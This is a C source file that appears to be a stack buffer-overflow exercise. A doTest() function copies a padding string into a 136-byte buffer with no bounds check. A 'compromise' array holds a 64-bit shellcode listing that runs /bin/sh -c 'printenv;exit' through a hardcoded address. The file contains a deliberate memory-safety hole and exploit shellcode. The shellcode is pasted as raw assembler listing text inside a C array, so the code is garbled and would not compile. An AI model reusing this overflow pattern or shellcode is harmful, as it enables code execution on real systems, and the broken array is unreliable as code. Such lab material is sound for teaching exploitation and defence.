#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[160] = {
                                      //bits 64
     2                                //            ; two nop matching size in selfcomp.c
     3 00000000 90                    //              nop
     4 00000001 90                    //              nop
     5                                //              ; find out where we are
     6 00000002 EB62                  //  start:     jmp short codeEnd
     7 00000004 5E                    //  start2:    pop rsi
     8                                //              ; clear the a register
     9 00000005 B800000000            //             mov rax,0x0
    10                                //              ; restore null bytes to data
    11 0000000A 884607                //             mov [byte rsi+flagStr-exeStr-2],al
    12 0000000D 88460B                //            mov [byte rsi+cmdStr-exeStr-1],al
    13 00000010 884619                //             mov [byte rsi+arrayAddr-exeStr-1],al
    14 00000013 48894632              //             mov [byte rsi+arrayAddr-exeStr+24],rax
    15                                //             
    16                                //              ; restore argv
    17                                //              
    18 00000017 4889761A              //             mov [byte rsi + arrayAddr - exeStr],rsi
    19 0000001B 488D7E09              //             lea rdi,[byte rsi + flagStr - exeStr] 
    20 0000001F 48897E1E              //             mov [byte rsi + arrayAddr - exeStr + 4],rdi
    21 00000023 488D7E0C              //             lea rdi, [byte rsi + cmdStr - exeStr]
    22 00000027 48897E22              //             mov [byte rsi + arrayAddr - exeStr + 8],rdi
    23                                //  
    24                                //             ; execve system call
    25 0000002B B03B                  //             mov al,0x3b
    26 0000002D 48BF-                 //             mov rdi,exeStr
    26 0000002F [6B00000000000000]    
    27 00000037 48BE-                 //             mov rsi,arrayAddr
    27 00000039 [8500000000000000] 
    28 00000041 4889E2                //             mov rdx,rsp
    29 00000044 48C1EA20              //             shr rdx,32
    30 00000048 48C1E220              //             shl rdx,32
    31 0000004C 488B0C25C056FBF7      //             mov rcx,[0x7ffff7fb56c0]
    31          ******************    //   warning: dword data exceeds bounds [-w+number-overflow]
    31          ******************    //   warning: dword data exceeds bounds [-w+number-overflow]
    32 00000054 4809CA                //             or  rdx,rcx
    33 00000057 488D3A                //             lea rdi,[rdx]
    34 0000005A 0F05                  //             syscall
    35                                //  
    36                                //              ; exit system call
    37 0000005C 4889C7                //             mov rdi,rax
    38 0000005F 4831C0                //             xor rax,rax
    39 00000062 B03C                  //             mov al,0x3c
    40 00000064 0F05                  //             syscall
    41                                //  
    42 00000066 E899FFFFFF            //  codeEnd:   call start2
    43                                //              ; data
    44 0000006B 2F62696E2F73685879    //  exeStr:    db "/bin/shXy"
    45 00000074 2D6358                //  flagStr:   db "-cX"
    46 00000077 7072696E74656E763B-   //  cmdStr:    db "printenv;exitX"
    46 00000080 6578697458         
    47 00000085 FFFFFFFF              //  arrayAddr: dd 0xffffffffffffffff
    48 00000089 FFFFFFFF              //             dd 0xffffffffffffffff
    49 0000008D FFFFFFFF              //             dd 0xffffffffffffffff
    50 00000091 FFFFFFFF              //             dd 0xffffffffffffffff
    51 00000095 93000000              //  newAddr: dd newAddr-start

};

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ" //0x4d4e4f505758595a
    "xxxxxxxx";
    // environ == 0x7ffff7fb5600

int i;
void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise1[i]; i++){
	buffer[i] = compromise1[i];
    }
}

